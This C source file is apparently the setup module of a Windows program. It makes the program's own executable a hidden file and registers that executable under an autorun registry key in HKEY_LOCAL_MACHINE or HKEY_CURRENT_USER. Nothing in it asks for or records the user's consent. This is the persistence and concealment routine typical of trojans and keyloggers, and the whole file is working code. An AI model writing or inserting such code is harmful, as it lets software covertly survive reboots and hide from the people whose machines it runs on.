#include "setup.h"

static bool autorun(const char *curr_path, const char *name_prog){
    HKEY key = NULL;
    if((RegOpenKeyEx(HKEY_LOCAL_MACHINE, AUTORUN, 0, KEY_WRITE, &key) == ERROR_SUCCESS) || (RegOpenKeyEx(HKEY_CURRENT_USER, AUTORUN, 0, KEY_WRITE, &key) == ERROR_SUCCESS)){
        if(RegSetValueEx(key, name_prog, 0, REG_SZ, (BYTE*)curr_path, strlen(curr_path)) == ERROR_SUCCESS){
            RegCloseKey(key);
            return true;
        }
    }
    return false;
}

static bool hide(const char *path){
    DWORD attr = 0;
    attr = GetFileAttributesA(path);
    if(attr & FILE_ATTRIBUTE_HIDDEN)
        return true;
    attr |= FILE_ATTRIBUTE_HIDDEN;
    return SetFileAttributes(path, attr);
}

bool setup(char *curr_path_app){
    char curr_path[LEN_VALUE_NAME];
    char *name_app = NULL;
    if(GetModuleFileName(NULL, curr_path, LEN_VALUE_NAME)){
        if((name_app = basename(curr_path)) != NULL){
            strcpy(curr_path_app, curr_path);
            hide(curr_path);
            autorun(curr_path, name_app);
        }
    }
    return true;
}
